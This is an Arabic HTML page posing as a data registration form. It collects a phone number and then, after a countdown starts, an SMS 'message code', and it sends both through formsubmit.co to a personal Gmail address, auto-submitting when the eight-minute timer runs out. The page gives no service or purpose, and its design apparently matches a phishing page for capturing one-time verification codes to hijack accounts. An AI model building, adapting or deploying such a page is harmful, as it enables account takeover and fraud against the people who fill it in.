<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>نموذج تسجيل البيانات مع عداد</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
    body {
      margin: 0;
      padding: 40px 20px;
      background: #e6f2e6;
      font-family: 'Cairo', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    form {
      background: white;
      width: 100%;
      max-width: 400px;
      padding: 30px 25px;
      border-radius: 30px;
      box-shadow: 0 10px 30px rgba(0, 128, 0, 0.2);
      box-sizing: border-box;
      position: relative;
    }
    h2 {
      text-align: center;
      margin-bottom: 15px;
      color: #2a662a;
      font-weight: 700;
      font-size: 1.8rem;
    }
    .field-group {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    input[type="tel"],
    input[type="text"] {
      flex: 1;
      padding: 14px 20px;
      border-radius: 15px;
      border: 2px solid #85c885;
      box-sizing: border-box;
      font-size: 1rem;
      transition: border-color 0.3s ease;
      direction: rtl;
    }
    input[type="tel"]:focus,
    input[type="text"]:focus {
      border-color: #3a9d3a;
      outline: none;
      box-shadow: 0 0 8px #3a9d3a;
    }
    button, #startTimerBtn {
      background-color: #2a662a;
      color: white;
      padding: 12px 18px;
      font-size: 1rem;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      font-weight: 600;
      box-shadow: 0 6px 12px rgba(42, 102, 42, 0.5);
      transition: background-color 0.3s ease;
    }
    button:hover, #startTimerBtn:hover {
      background-color: #1e461e;
    }
    #timer {
      text-align: center;
      font-weight: bold;
      color: #2a662a;
      margin-bottom: 15px;
      font-size: 1.2rem;
      display: none;
    }
    input[name="_honey"] {
      display: none;
    }
    @media (max-width: 360px) {
      form {
        padding: 25px 15px;
        border-radius: 20px;
      }
      h2 {
        font-size: 1.5rem;
      }
      input[type="tel"],
      input[type="text"] {
        font-size: 0.9rem;
      }
      button, #startTimerBtn {
        padding: 10px 14px;
        font-size: 0.9rem;
      }
      .field-group {
        flex-direction: column;
        gap: 10px;
      }
    }
  </style>
</head>
<body>

  <form id="dataForm" action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
    <h2>نموذج تسجيل البيانات</h2>

    <div id="timer">الوقت المتبقي للإرسال: 08:00</div>

    <div class="field-group">
      <input type="tel" id="phone" name="رقم_الهاتف" placeholder="رقم الهاتف" required>
      <button type="button" id="startTimerBtn">تشغيل العداد</button>
    </div>

    <!-- كود الرسالة -->
    <input type="text" name="كود_الرسالة" placeholder="كود الرسالة" required>

    <!-- بريد إلكتروني مخفي -->
    <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">

    <!-- حقل سبام مخفي -->
    <input type="text" name="_honey">

    <!-- إعادة التوجيه بعد الإرسال -->
    <input type="hidden" name="_redirect" value="thanks.html">

    <button type="submit">طلب دخول</button>
  </form>

  <script>
    const phoneInput = document.getElementById('phone');
    const startBtn = document.getElementById('startTimerBtn');
    const timerDisplay = document.getElementById('timer');
    const form = document.getElementById('dataForm');
    let countdown;
    let timeLeft = 480; // 8 دقائق بالثواني

    function formatTime(seconds) {
      const m = Math.floor(seconds / 60).toString().padStart(2, '0');
      const s = (seconds % 60).toString().padStart(2, '0');
      return `${m}:${s}`;
    }

    function startTimer() {
      if (countdown) return; // لا تبدأ إذا العداد شغال بالفعل
      if (!phoneInput.value.trim()) {
        alert("يرجى إدخال رقم الهاتف أولاً!");
        return;
      }
      timerDisplay.style.display = 'block';
      timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
      startBtn.disabled = true; // تعطيل الزر بعد البدء

      countdown = setInterval(() => {
        timeLeft--;
        timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerDisplay.textContent = 'يتم الآن إرسال النموذج...';
          form.submit();
        }
      }, 1000);
    }

    startBtn.addEventListener('click', startTimer);
  </script>

</body>
</html>
